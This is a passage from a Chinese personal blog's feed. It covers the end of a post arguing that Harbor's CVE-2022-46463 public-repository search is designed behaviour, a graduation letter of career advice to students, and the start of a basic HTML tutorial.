src="https://blog.dvkunion.cn/img/16740222537273.jpg" alt=""><br>结果两个公开仓库都被搜索出来了，而且还标注着<code>private</code></p><p>.......看到这里的各位，应该能猜测这是一个什么问题了。</p><h2 id="个人观点">个人观点</h2><p>经过复现，我想大家也知道这个 <code>CVE-2022-46463</code> 到底是个如何的漏洞了：通过该接口，能够搜索到所有的公开仓库。</p><p>对于第一点，已经没有讨论的必要了，问题来到第二点：仅能搜索到公开仓库，到底还是不是一个漏洞。</p><p>在判断是否是个漏洞之前，需要先达成两点共识：</p><ul><li>public 镜像，到底是面对所有用户，还是所有的认证用户。</li><li>到底什么才叫做漏洞</li></ul><p>个人认为，harbor很明显的认为 public 镜像是针对所有用户。可以从官方的手册上搜索到public 的概念，也可以类比 dockerhub 私有镜像和公开镜像的概念。因此我个人认为，public 的定义并无任何问题。</p><p>而至于：什么是漏洞，我想引介《我的安全世界观》中的观点：</p><blockquote><p>程序的目的是为了实现业务功能<br>程序的实现可能额外实现了些其他的功能<br>这些其他的功能影响到安全，就可以被称漏洞。<br>其中，影响安全才是定义的关键。</p></blockquote><p>来看这个api的设计，harbor的定位就是想要搜索到所有的 public 镜像，程序完美的实现了目的，且没有搜索到额外的private镜像。 程序没有做超出业务功能的事情；同时在官方的手册里，清晰明了的定义着什么是<code>public</code>权限。</p><p>除此外，我们再来看影响：搜索到公开仓库，会对企业带来什么样的影响，有怎样的安全隐患。</p><p>在该漏洞所描述中，公开仓库可能会“导致信息泄露”，获取到镜像信息。</p><p>我们知道，镜像其实就是一个打包好的分层的文件系统。那么对于获取到这个文件系统的人来说，他可以获取到这个镜像内部的任何信息。</p><p>如果说是由于harbor 的原因导致的这部分信息泄漏，那么即使是公开的镜像，harbor 也应该为这个事情负责。而事实是，任何获取到这个文件系统的人，都能够获取到harbor 所展示出的这部分信息。 这样来讲，harbor只是个搬运工而已，仅仅展示了一些任何人都能够读到的数据而已。导致信息泄露的，应该是归属于 <strong>“镜像安全”</strong> 的范畴。</p><p>因此，我们应该把漏洞中所描述的“敏感信息泄漏”，视作是镜像安全问题，而并非harbor 应用本身。漏洞的原因是在于镜像夹杂了不应该被打包进去的数据。该问题并不关心你是用的是harbor 仓库还是portus 仓库，还是dockerhub 仓库，他就是这个镜像本身携带的问题。</p><p>唯一能被视为漏洞影响点的，就是在于，用户如果想获取有哪些镜像的这个信息，原本只能够通过猜测或已知的镜像名称，通过pull 的方式获取到镜像本身。在未知镜像名的条件下是比较困难批量获取到更多信息的，只能尝试暴力猜解。而公开仓库搜索提供了这样一个便利的入口来展示当前能获取的镜像列表，对攻击者提供了帮助。</p><p>这样，问题又回到了第二个点。public 仓库面向所有用户而非认证用户，是否存在问题。</p><p>当业务功能存在部分风险时，那么应该告知并警惕用户使用的方式，正确使用该功能。我们来看下harbor是如何做的：<br><img src="https://blog.dvkunion.cn/img/16740177839330.jpg" alt=""><br><img src="https://blog.dvkunion.cn/img/16740178868992.jpg" alt=""><br>在项目创建页面，harbor清楚的描述着 什么叫做public仓库，告知了： &quot;无需login即可docker pull&quot;。同时，公开仓库还是一个非默认选项，默认创建的仓库都是私有的。我实在想不出还有什么别的方式能够来&quot;帮助&quot; 用户 建设意识上的安全问题。</p><p>就好比 php exec函数，你不能说exec可能会执行恶意命令，就直接说php存在漏洞，而直接不允许了业务使用该函数。exec本身并不是漏洞，但当你使用的方式不正确时，的确会造成一定的安全风险。这个比喻模型同样可以适用于 <code>CVE-2022-46463</code>。</p><h2 id="综合评估">综合评估</h2><p>最终，我们为这个&quot;漏洞&quot;（如果非要说是的话，毕竟有了CVE编号）做一个客观的评估。</p><h3 id="漏洞描述">漏洞描述</h3><p>Harbor api search 允许未认证的用户搜索仓库内存在的 公开仓库，若将私有业务镜像放置于公开仓库，可能存在信息泄漏风险。</p><h3 id="漏洞级别">漏洞级别</h3><p>中危偏低，无需紧急修复，但仍需引起注意，排查仓库权限设置是否正确。</p><h3 id="漏洞修复建议">漏洞修复建议</h3><p>官方最新版本仍存在上述特性，升级修复属于无稽之谈。</p><h4 id="对于无public需求的用户">对于无public需求的用户</h4><p>直接全部设置为私有项目即可。</p><h4 id="对于仍需public功能但又担心风险的用户">对于仍需public功能但又担心风险的用户</h4><p>可以手动创建一个全局用户，然后将这个用户添加到所有项目中，最后将所有项目设置为私有。</p><p>这么做可能会导致，原本可以直接获取到的镜像信息，现在都需要使用该账户进行认证后获取，可能会对您的自动化业务(如 CI/CD) 产生影响。</p><p>除此之外，您也可以考虑从根源解决问题。该漏洞最大的安全隐患在于 敏感信息的泄漏。而这些风险来自于没有进行过安全检查的公开镜像。因此，可以使用云安全工具进行检测，如：使用 <a href="https://rivers.chaitin.cn/app/veinmind">Veinmind-SaaS</a> 版本对harbor仓库进行扫描，支持云探针扫描方式，无需部署探针，实现快速一键式解决公开镜像的安全问题：<br><img src="https://blog.dvkunion.cn/img/16740240275239.jpg" alt=""><br>也可以选择轻量级的 <a href="https://github.com/chaitin/veinmind-tools">Veinmind-Tools</a> 对您重点关注的镜像，一一进行人工排查，保证您的镜像安全。<br><img src="https://blog.dvkunion.cn/img/20220415144819.gif" alt=""></p><p>除此以外，对于仍认为 <code>public</code> 仓库应该在登陆后才能够被访问的用户，可以选择非harbor的同级别产品如<a href="http://port.us.org/documentation.html">portus</a>，所有的仓库必须在登陆后才有权限访问，即使是public仓库。</p><h2 id="最后">最后</h2><p>整个CVE 从最初的大家都无法复现却存在编号的漏洞，到有人站出来说根本不应该称之为漏洞，再到认为Harbor的设计不合理，没有做到所谓的“尽可能的安全设置作为默认设置”，到最后的呼吁不要仅关注漏洞本身，而是要更关注客户的安全，为客户负责的角度。 这个&quot;漏洞&quot;属实在2022年的年终 荒诞而又魔幻的 结束了这荒诞而又魔幻一年。</p><p>从安全的角度来想，我不理解为什么这样的一个&quot;漏洞&quot;，如此简单粗暴的过程，无官方的fix记录，仅有一堆雷同式的公告，却鲜有不同的声音。</p><p>从产品的角度上来想，我觉得这类的安全问题，并不是一个产品上能够 cover 的事情，而是用户意识上的安全。类比弱口令，如果我们真的认为，默认复杂的密码就可以解决弱口令的问题，而没有关注用户自身意识的安全建设，那么对于安全意识较差的用户来讲，他甚至可能会觉得默认密码过于复杂而吐槽产品，然后自行将密码修改为了弱口令。为什么一个开源的产品，明确写的特性，明确写的功能提示，还需要为用户的安全意识建设买单？</p><p>手机很好用，但你总担心手机屏幕的屏保图片会被别人偷窥到你的隐私，你很担心，因为你把有银行卡密码的图片作为了屏保，说这个手机要是屏幕保护不会被偷窥就好了，手机做的还是不够好啊。</p><p>有没有一种可能，当大家都意识到屏幕保护就是要给别人看的时候，就不会把隐私的图片，设置为屏幕保护了？我们作为专业人员要做的，是告诉用户，用密码做屏幕保护，这么做不安全，提高用户的意识，而不是和用户一起诟病手机这产品为什么不去做一个只有我自己能看到屏幕保护的功能，去对线开源社区去争执一个特性到底是否是漏洞。</p><p>见贤思齐焉，见不贤而内自省也。不论这个CVE最终会如何收尾，不论这个事情会走向何种结局，对于使用了harbor的用户，看到了这个CVE, 都应该思考一下，对于public的理解是否正确，自家使用的harbor会不会同样存在安全隐患；是否需要考虑镜像安全的检测来加强防护。</p><p>最后也希望，大家能对开源社区多一些包容，多站在互相的角度进行思考，多把精力集中到一些有价值的事情上去。安全和产品，从来不应是对立面，也永远不会是对立面。</p><h4 id="参考链接">参考链接</h4><blockquote><p>17.Veinmind-SaaS : <a href="https://rivers.chaitin.cn/app/veinmind">https://rivers.chaitin.cn/app/veinmind</a><br>19.Veinmind-Tools : <a href="https://github.com/chaitin/veinmind-tools">https://github.com/chaitin/veinmind-tools</a><br>21.portus : <a href="http://port.us.org/documentation.html">http://port.us.org/documentation.html</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Harbor 未授权漏洞的背后是魔幻的荒诞主义&lt;/h1&gt;
&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;怎么说呢，心里五味杂陈，面对在大年前横空而来的 &lt;code&gt;CVE-2022-46463&lt;/code&gt;，以及一通测试复现后，面对着电脑屏幕久久说不出话来，于是便有了这篇</summary>
      
    
    
    
    <category term="Bugs" scheme="http://blog.dvkunion.cn/categories/Bugs/"/>
    
    
    <category term="云安全" scheme="http://blog.dvkunion.cn/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞跟踪" scheme="http://blog.dvkunion.cn/tags/%E6%BC%8F%E6%B4%9E%E8%B7%9F%E8%B8%AA/"/>
    
  </entry>
  
  <entry>
    <title>给学弟学妹的一封信</title>
    <link href="http://blog.dvkunion.cn/2020/06/22/%E7%BB%99%E5%AD%A6%E5%BC%9F%E5%AD%A6%E5%A6%B9%E7%9A%84%E4%B8%80%E5%B0%81%E4%BF%A1/"/>
    <id>http://blog.dvkunion.cn/2020/06/22/%E7%BB%99%E5%AD%A6%E5%BC%9F%E5%AD%A6%E5%A6%B9%E7%9A%84%E4%B8%80%E5%B0%81%E4%BF%A1/</id>
    <published>2020-06-22T20:09:12.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>给学弟学妹的一封信</h1><p><i>2020-6-22</i><br>我毕业了......</p><hr><h2 id="b-0x00-序-b"><b>0x00 -- 序</b></h2><!-- split --><p>首先这篇文章可能会有点长，但是如果是你现在是大二、大三或者准大四的同学，并且正对未来处于一个迷茫的状态，你可以尝试耐住性子去读完剩下的部分。大一的同学有兴趣也可以看一下，没兴趣就关掉赶紧去享受你美好的大一生活（手动狗头）。</p><p>写这篇文章纯粹是因为突然意识到，已经2020年了，拿到了毕业证的我已经毕业了。由于今年的特殊原因，没有毕业典礼，也没有回校拍毕业照和参加最后的见面会，第二天还要继续上班工作，就像什么也没有发生一样，空空的总觉得缺少了一些仪式感。也是刚好想到最近有几个<b>学妹</b><del>(和学弟)</del>会和我咨询关于未来规划和工作的一些事情，所以想还是尽力去留下一些什么，也算是自己给自己做一个完结性质的毕业典礼吧。</p><p>希望能给大二大三以及准大四的学弟学妹们一些有用的帮助吧，虽然我也是咸鱼一条。｡ﾟヽ(ﾟ´Д`)ﾉﾟ｡</p><span id="more"></span><blockquote><p>P.S. 写完了之后我发现我的废话真的是很多，所以在这里加一个课代表的座位总结一下每个章节的重点，供后辈们有选择性的进行阅读，珍惜各位的时间。</p><ul><li><a href="#0x0A">0x01 我的大学四年生活详情</a></li><li><a href="#0x0B">0x02 大学四年期间的一些个人感悟和心得</a></li><li><a href="#0x0C">0x03  Q&amp;A 一些常见问题</a></li><li><a href="#0x0D">0x04 个人的一些建议</a></li><li><a href="#0x0F">0x05 祝福语</a></li></ul></blockquote><h2 id="b-id-0x0A-0x01-我的四年-b"><b id=0x0A>0x01 -- 我的四年</b></h2><p>现在想想四年的时间真的是过的很快，2016年刚入学校时候第一个感觉是略有失望，因为学校太小哈哈哈哈哈我总以为大学起码要大一点才能突显和高中的不同。其实总的来说我们学校地理位置还是很优越的，毕竟不是哪个学校都能紧挨着一个湖，离火车站一站地铁、市中心3站地铁的优越位置。╮(╯_╰)╭</p><p>大一刚入学，我是彻底的玩了一年，毕竟经过了恶心的高中终于解放了，所以大一基本没什么好说的，参加各种社团活动，各种团建，爽是真的爽，但是欠下的债总要还的。</p><p>到了大二才算是准备看一看自己能够做些什么了，大二也是我参加各种活动最多的一年。从参加蓝桥杯为契机，到参加电子设计竞赛，再到大创、数学建模、ACM区域赛(我太菜了都不好意讲出来)，直到最后的CTF竞赛。基本算是学校本院内能够参加的一些竞赛我都在这一年内去尝试了一遍(也就是尝试了一遍而已，基本都是成功参与(´Ａ｀。))。有好处也有坏处吧，好处是我就和逛菜市场一样转了一大圈最后才买到自己想要的萝卜，但总归是买到了，而且在这个过程中也学到了不少新鲜的东西。坏处就是浪费了整整一年的时间，才发现了自己喜欢和想要去做什么。</p><p>我一直是电子系专业的，但是实在是对各种电路打不起兴趣，也尝试去参加电子设计大赛试试能不能改观一下对这个专业的印象，然后并没有什么卵用，喜欢就是喜欢，不喜欢就是不喜欢。当时在大一结束也考虑不如直接就转专业去计算机系，然后纠结的考虑了很久之后觉得要重修的课比较多，同时还比较年轻，有自信觉得就算在电子系也能兼顾两边进行学习....(〒︿〒)我也不知道我哪来的自信(其实就是懒不想补课)。然后就错过了最佳的转专业的机会，到了大二专业课开课后就十分的难过了.....信号系统真不是人学的。(QAQ)</p><p>也是因为大二和学长(钱学长)交流之下，我确定了不去参加考研。当时的眼光还仅限于在学校之内，接触到、了解到的事物还仅限于学校之内。在大二升大三的暑假和学长的交流下才了解到出了校门之后，外界使用的一些技术、都有哪些工作、工作都是干些什么的。这也是当时学长给我的最好的建议，如果已经决定不考研的话，能尽早出来感受一下工作的分为就尽早感受，这样你能很快的了解到，互联网这个行业到底是一个什么样子的，而不是仅在学校这个像庇护所一样的圈子内一直坐着等着。</p><p>于是大三就是我走出舒适圈的一个转折点，因为不是计算机专业，计算机网络、Linux等等基础性的东西我都仅是一知半解，没有一个体系化的知识框架，再加上我个人的自制力比较差，自学可能就是三天打鱼两天晒网最后不了了之了，我报了一个外部的培训班，算是从宏观面上整体的对基础性的知识有一个体系化的学习和了解。同时也充分利用学校的资源，蹭了几节胡老师的计算机网络的课，也得到了不少的收获。</p><p>总的来说，大三是我在确定了自己的方向后，开始针对这个方向需要的一些技能和要求进行专业性的学习。也是最痛苦的还债的一年。基本上是周一周五先要照顾自己专业的课程，有空课去计算机系蹭一下课，周末两天要坐地铁到南大附近上课培训，基本是没有什么休息的时间了。晚上回来之后还要去更新笔记，如果有操作的一些东西尽量都要自己动手去操作一遍。这样度过了一个难熬的学期。</p><p>然后就到了大三的寒假，准备开始尝试投递简历找一份实习了。第一次投简历也是很愁人，怎么做简历、怎么找公司信息、怎么准备笔试面试...都没有做过，也不知道怎么去准备。也不知道自己的技能有没有符合招聘的标准、能不能胜任岗位的工作、会不会太菜了被面试官笑话等等等等...相对来说投简历的确会十分焦虑，每天期待着自己的邮箱多一个小红点，然后发现收到的邮件是：很抱歉，您不符合我们的岗位要求。心态直接炸裂......</p><p>但最终还是找到了一家在南京本地的实习机会。出来实习之后就真的发现，工作和学校里就有着很大的区别。基本上很少有时间来给你去进一步的沉淀自己的知识积累，工作就是把你以前所有积累的东西拿出来用一用了，你沉淀了多少东西，就能在工作中产生多大的价值。</p><p>也是因为有了这一段宝贵的实习经历，让我在后面的正式应届招聘里有了一张强力的底牌，也是最后我认为能拿到offer的关键一点。<b>所以如果你确定是不考研准备工作，那么务必！务必！要找一个有价值的实习工作。  </b></p><p>总的来说我的四年大学生活，其实真的就是只有三年，第一年用来娱乐享受；第二年参加各种竞赛，认识了各种各样有趣的人和朋友，参加到了计协大家庭，给了我很多前进的动力；第三年用来艰苦奋斗，开始为自己喜欢的事情做好充足的准备；第四年的时候就已经很少在学校了。</p><p>时间是真的过的很快的，我的大学四年也大概就是这个样子。</p><h2 id="b-id-0x0B-0x02-个人心得-b"><b id=0x0B>0x02 -- 个人心得</b></h2><p>如果说要让我来谈一下大学四年间生活的一些感悟和心得，那我觉得最重要的就是，<b>在大学期间加入了自己喜欢的圈子，认识了一群有趣的人。</b>我一直很感激能加入了计协，从一开始的C代码都写不好的菜鸡，被郭佬吉佬带到能称为计协技术部部长：计协有大一黝黑平头、满嘴火车炮但是认真教你写代码的郭佬(狗头)、陪我在机房一起熬到9点多的杜杜、一起准备比赛的吴同学、专业知识丰富的吉佬等等；也很感激在参与众多竞赛遇到的各路大神，像在数模认识的陆大佬、蒋神，他们的逻辑思维和数学能力给了我不少启发，还有我的数模队友，漂亮的写手李小姐姐、专业严谨的冯同学、以及提供给我不少工作经验的郑同学；以及在其他竞赛里遇到的在其他领域突出的一些大佬。在和大佬的交流和生活之中会不自然的被他们影响，朝着他们学习。所以我很感激通过各种方式能够认识这些优秀的人，从他们身上或多或少的学习到一些东西。</p><p>除此之外，我觉得在我大学生活中同样起到很大帮助的是和<b>正确的</b>老师多沟通。老师往往能给我们很多的经验和处理问题的方法，具有很高的参考价值。多和好老师<b>(纳姐)</b>多多沟通，听一听老师的建议往往对你迷惑的时候会很有帮助。</p><p>再要回想的话，也就是能感谢在大三坚持下来的自己吧。刚入门的时候真的是什么也不会、什么也做不出来。研究一个东西一星期最后什么结果也没有，能在这种绝望的情况下一次又一次的坚持下来，沉淀出到现在的一些东西，可能换做现在的我是已经做不到了的。</p><h3 id="b-id-0x0C-0x03-Q-A-一些问题-b"><b id=0x0C>0x03 -- Q&amp;A 一些问题</b></h3><p><b><font color = "red">Q：到底是应该考研还是工作？ </font></b></p><p><b>Me:</b> 这问题在大二暑假就很折磨我，我想一般处在这个时间节点的同学都有着这个问题，我到底是应该考研还是应该准备工作？还是应该着手两方面同时准备？</p><p>在大二之前，我是没有什么想法的，对社会上有哪些工作岗位、工作具体都是做些什么的都不了解，对考研也只有一个是升学的概念。眼看已经大二升大三了，准备考研的同学都开始准备要复习了，我却还没决定好到底是考研还是工作。然后就在一个偶然的机遇下和已经工作的学长聊了聊，给了我不少的启发，然后就奔向&quot;愉快&quot;的工作了。</p><p>至于我个人，我依旧是这个看法：考研和工作，应该取决于你到底想要做什么？考研能让你有一张更具有竞争力的王牌，能够让你在未来的竞争中能从大众的筛选线脱颖而出；同时考研给了你更多的缓冲期，你可以用更多的时间去积累、沉淀你的知识和技能。而工作，锻炼的更多的是你的综合能力。因为企业招聘应届生通常看中的更多是这个人的可塑性，所以更考察你接受新事物的能力、学习能力、以及和工作同事、上级的沟通能力、执行能力，最后还要求你的技能要能够符合岗位基本需求，相比考研更像是开始应用你这些年积攒下的知识财富。</p><p>通过对这两个不同路线的描述，你要考虑的是未来的你想要做一些什么？ 未来是想要进入大厂，在技能上做一些研究？还是想要接触最前端的技术，做一些人工智能、大数据分析等等听起来很上流的工作？还是准备搞科研，读博士，或者是就是想做一个码农，搞开发？根据你想要做的事情的不同，你要选择那条路也就一清二楚了。要说的是，这两条路没有什么好坏之分，没有什么哪一条比另一条会更好这一种说法，只要你能确认，你是因为自己想要做的事情需要我考研(或工作)，而不是因为跟随大家&quot;好多同学都考研(工作)了我也去考研吧(工作吧)&quot;这种想法，我觉得就没有任何问题。</p><p><b><font color = "red">Q：计算机专业出身到底能做些什么事情？</font></b></p><p><b>Me:</b>说实话对于这个问题我只能以我现在的菜鸡视野来给你们解答，因为我也是一个刚入职场的小白。一般来说，互联网行业从服务对象上来分类分为甲方和乙方：甲方通常指提出需求的一方，而乙方就是来实现甲方爸爸需求的一方。按照这种分类，公司的职能体系也会有所不同，招聘的岗位也会有所不同。</p><p>技术岗位通常会比较偏向技术，需要有一定的专业技术能力，如开发岗，包含各种各样的语言开发：java、python、go、c++等等，岗位顾名思义就是进行产品代码开发；还有运维岗：这个岗位偏向IT技术一些，需要对电脑的常识和硬件有一定了解，日常负责维护机房、监控一些服务的运行状态等等。大一点的公司运维岗会分的很细，有专门负责网络的网络工程师、负责维护和监控服务器的运维工程师，负责数据库维护的DBA等等；再大一点的公司可能会有架构师的岗位，负责设计公司某个项目的整体框架：使用哪些技术栈、要用什么语言、什么协议进行通信，数据库的选型等等；除了这些之外还有很多很多的岗位：测试岗，测试开发岗、自动化岗位等等等等。很多公司还会按照自己的需求去招聘一些公司特有的岗位。</p><p>如果你还不知道自己想做什么，不妨去各大大型互联网公司的官方招聘网站上，看一下招聘的岗位和岗位需求描述。你能够很快的知道，大公司里面有什么样的岗位、使用什么样的技术，后面在学习的时候可以针对性的在这个方面进行研究学习。</p><p><b><font color = "red">Q：XXX竞赛有价值吗？值得参加吗？</font></b></p><p><b>Me:</b> 如果你是一位大一或大二的同学，不论你提问的竞赛是什么，我都会告诉你，有价值！参与就完事了。但是如果你已经大三或步入大四了，那么我觉得你就要考虑一下，这个竞赛到底是做什么的，对我到底能不能起到一些帮助。因为在大一和大二，你是有大把的时间来进行不断地尝试，来遇见各式各样的人，竞赛会成为一个很好的平台来帮助你丰富完善你的大学生活；而大三大四你已经要开始为马上到来的远征准备冬粮，时间是十分宝贵的，你能在这个冬天存多少粮食，在未来的考研战场或是面试战场上你就有多少的底气去拼。所以每一个选择都要问一下自己，是否还需要这样做了。对于大三和大四的同学，我觉得不仅仅是要考虑竞赛这个问题，对于一些其他的活动，都应该以这样的一个角度去思考了。因为到了这个节点时间真的是很不够用了。以工作为例，大三上学期的寒假最好就可以去尝试投递简历、尝试找一份实习的工作，大三下的暑假就已经是秋招了。<b>千万不要以为秋招是大四暑假毕业才开始的!!!!!</b>而且很多大厂的秋招和春招都会有提前批，使你的准备时间更少。时间还是非常宝贵的。</p><p><b><font color = "red">Q：怎么准备春招/秋招？</font></b></p><p><b>Me:</b> 首先准备春招/秋招，你需要一份简历。对自己没有那么足的自信的同学，我建议你需要一份自己的简历模板。什么意思呢？就是你需要按照不同公司对岗位的描述，来修改你的简历，有针对性的投递，这样成功率往往会成功很多；对自己经历和技能很满意的，也可以直接做一份通用式的简历，然后直接拿出来用就可以了。简历没有什么具体的要求，它类似于一份自我介绍，让对方企业以最快的方式了解你这个人。一般来说要包含你的个人信息、学校经历(觉得自己成绩不错的同学也可以在简历里提一下，突出你自己的优势)、实习或工作经历等。<b>简历很重要，往往后面的面试过程，面试官都是根据你的简历里面写的内容进行提问的，所以不要为了满足岗位要求而写了一堆虚假的信息。</b></p><p>一般来说 春招 是 秋招的一些补充，往往秋招没有招满的企业会继续在春招发布招聘启事，或事招聘一些实习岗位。<b>所以春招是寻找实习的最佳机会。</b>一般春招是从寒假的年后开始，2-3月份的样子，当然像腾讯阿里等等通常都会提前开启招聘通道，需要自己去关注。</p><p>秋招就是正式的应届招聘了，一般秋招在6-8月份开始，近些年出现的提前批等等导致其实在4月、5月就已经有一些秋招的信息了。这些招聘信息你可以在一些应届招聘的网站如：牛客网、实习僧等等找到统一的招聘启事，偶尔还有有内推的帖子；但最正规的途径还是去这个公司的官网。找到一个名称类似于人才招聘的链接，然后一般大厂都会有专门的校招页面。可以在这里面去寻找本年度该公司需要的人才。这样做同样也有一个好处：你的简历是直接推送到对方企业的，而不是经过那些第三方平台的存储，可以减少你个人信息泄漏的风险。</p><p>我当时的方法是：通过牛客网等等提供的统一招聘信息，知道了有哪些公司在进行招聘，然后通过谷歌去找到他们官网，在他们的官网获取到更详细的信息后进行投递。</p><p>春招秋招的大体流程都是差不多的，投递简历，等待简历筛选，通知笔试/面试，参加一面/二面/三面......最后如果都通过了进入HR面，和你谈论你的薪资定位以及公司的福利待遇，如果没什么问题就会给你发放offer进行签订，招聘的流程基本就完成了，剩下的就是等毕业后拿着毕业证、学位证去公司报道就可以了。</p><p>在投递简历的时候我个人的建议是：多尝试！不要怕失败，因为失败最多就是收不到回复邮件或是收到了拒绝邮件....(´Ａ｀。)多被拒绝几次就习惯了，但是对你个人来说是你自己的一次宝贵的经验！而且，说不定你多投递的这一家，丫就成功了呢？(,,・ω・,,)人如果没有梦想，那和咸鱼有什么区别？</p><p>最后放一张我当年投递简历做的表，真的是一段艰苦却很有价值的岁月。</p><p><img src="https://blog.dvkunion.cn/img/WX20200630-152324%402x.png" alt="投递的一部分截图"></p><p>我暂时就想到这些问题，如果还有其他的问题，也可以在QQ上联系我，如果我知道的都会尽力去帮你解答。</p><h2 id="b-id-0x0D-0x04-个人的一些建议-b"><b id=0x0D>0x04 -- 个人的一些建议</b></h2><p>(*´∀`)~♥其实说实话我不太喜欢给别人建议，因为我觉得每个人的情况都不相同，所以很多选择或是方法并不能对所有人都起到作用，而且我也不是什么很有价值的前辈，只是一个比你们早几年结束了学习生活和你们一样的菜鸡(╥﹏╥)。所以这一块大家也就是听听就好，觉得有用的话就参考一下下就可以。</p><p>首先是大学生活方面，一定不要浪费了大学的这四年生活，因为这是你去学习、去了解一些东西的最好的时间段，同时还有一群人能陪你一起去学习进步。等到工作或是读研之后，时间就变得十分紧迫了，接触和学习的范围也变得狭窄了，仅限于自己工作的内容或是研究的内容了。所以大学四年的时光一定要好好的珍惜。</p><p>其次是学习的一些方法，一定要做好沉淀和积累，可以是以笔记的形式，我个人更推荐已博客这种形式，提倡开源和分享精神。可以是一个小的知识点，也可以是一整块大的知识体系框架。在刚开始的时候可能没有什么感觉。等你坚持了一段时间你会发现，原来已经有了这么多的东西。同时这也是你复习和避免未来忘记的好帮手，我现在有些命令还需要查我以前的博客才能想起来怎么用......</p><p>最后是心态上的一些建议。大三那一年真的是忙碌的一年，上完专业课再去别的班级蹭课，周末再自己一个人做好几站的地铁去遥远的南大，和一群其他学校的陌生人一起听课。赶上投递的简历又总被pass，找不到工作，真的是精神很压抑的一阵。所以多和自己的小伙伴聊聊天，适当的也要学会自己缓解自己身上的压力，如果没法调节好自己的心态你会发现所有的事情都会变得越来越糟。和有可能你刚被上一个面试官嘲笑完，就要马上进行下一轮面试，你不能把刚才的情绪带到一段新的对话当中。抽时间可以去玄武湖走一走，转换一下心情，熬过去这一段最痛苦的时光就是柳暗花明。</p><h2 id="b-id-0x0F-0x05-祝福语-b"><b id=0x0F>0x05  -- 祝福语</b></h2><p>在离开学校的最后，留给学弟学妹们几句祝愿吧。</p><p>愿你们都能够学业有成，拿到自己想要学校或公司的offer。</p><p>愿你们都拥有似锦前程，在喜欢的未来做着自己喜欢的事情。</p><p>愿你们都怀着感恩之心，行程千里不忘恩师(纳姐)滴水之恩。♥(´∀` )人</p><p>愿你们都沐浴到幸运女神的眷属，在未来不要遇到太多的艰苦和歧途。</p><p>愿你们有一天都能与重要的人相逢。</p>]]></content>
    
    
    <summary type="html">&lt;h1&gt;给学弟学妹的一封信&lt;/h1&gt;
&lt;p&gt;&lt;i&gt;2020-6-22&lt;/i&gt;&lt;br&gt;
我毕业了......&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;b-0x00-序-b&quot;&gt;&lt;b&gt;0x00 -- 序&lt;/b&gt;&lt;/h2&gt;
&lt;!-- split --&gt;
&lt;p&gt;首先这篇文章可能会有点长，但是如果是你现在是大二、大三或者准大四的同学，并且正对未来处于一个迷茫的状态，你可以尝试耐住性子去读完剩下的部分。大一的同学有兴趣也可以看一下，没兴趣就关掉赶紧去享受你美好的大一生活（手动狗头）。&lt;/p&gt;
&lt;p&gt;写这篇文章纯粹是因为突然意识到，已经2020年了，拿到了毕业证的我已经毕业了。由于今年的特殊原因，没有毕业典礼，也没有回校拍毕业照和参加最后的见面会，第二天还要继续上班工作，就像什么也没有发生一样，空空的总觉得缺少了一些仪式感。也是刚好想到最近有几个&lt;b&gt;学妹&lt;/b&gt;&lt;del&gt;(和学弟)&lt;/del&gt;会和我咨询关于未来规划和工作的一些事情，所以想还是尽力去留下一些什么，也算是自己给自己做一个完结性质的毕业典礼吧。&lt;/p&gt;
&lt;p&gt;希望能给大二大三以及准大四的学弟学妹们一些有用的帮助吧，虽然我也是咸鱼一条。｡ﾟヽ(ﾟ´Д`)ﾉﾟ｡&lt;/p&gt;</summary>
    
    
    
    <category term="essay" scheme="http://blog.dvkunion.cn/categories/essay/"/>
    
    
    <category term="随笔" scheme="http://blog.dvkunion.cn/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>前端基础</title>
    <link href="http://blog.dvkunion.cn/2019/07/22/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/"/>
    <id>http://blog.dvkunion.cn/2019/07/22/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/</id>
    <published>2019-07-22T23:43:22.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>前端基础</h1><center><small>2019-07-22</small></center>感觉很久没写博客了，很久没有静下心来学习了。开始从开发的角度取写一些站，和框架工具。把全栈的知识补一补。  <center><small>华丽的分割线</small></center><hr><h3 id="b-0x00-简介-b"><b>0x00- - 简介</b></h3><p>说到前端，想到的无非就是三个兄弟：HTML CSS JavaScript。<br>所以就按照顺序把这三个兄弟都熟悉一遍，相对来讲Html和CSS会简单一些，重点在Js上多下一些功夫。</p><h3 id="b-0x01-HTML-b"><b>0x01- - HTML</b></h3><p>Html又被称作超文本标记语言，是我们在构造web网页的一种基础的标准语言。浏览器会将其解析成我们所看到的网页格式。<br>在接触过Markdown语法之后，其实感觉HTML语言是和其十分类似的。不同的是作为标记的标签在html中是成对出现的，是一种标记标签 (markup tag)。</p><p>HTML还有一个兄弟叫做HTML5。emmm一开始也分不清这两个东西，类似于python2 和python3的感觉吧，h5的语法和声明上和html略有不同，增加了很多人性化的标签。可以看作是一个更新的版本吧。</p><p><b>声明</b><br><code>&lt;!DOCTYPE html&gt;</code><br>一般在.htm .html文件的开头，总会有这样一句。用于声明该文件为html5文件。<br>不同版本的html语言所用的声明有所不同。</p><p><code>&lt;html&gt;&lt;/html&gt;</code><br>这对标签声明了html页面的主体部分，展示html的根元素。</p><p><code>&lt;head&gt; &lt;/head&gt;</code><br>head标签声明了html头部分，描述文档的数据内容。</p><p><code>&lt;body&gt; &lt;/body&gt;</code><br>body标签声明了html内容的主体部分，展示所呈现给浏览器可视化的部分。</p><p>这几部分的声明就可以构造出一个简单的标准html页面，例如我们写出一个hello world的页面：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">            &lt;title&gt; Hello Html &lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1&gt;Hello world &lt;/h1&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span 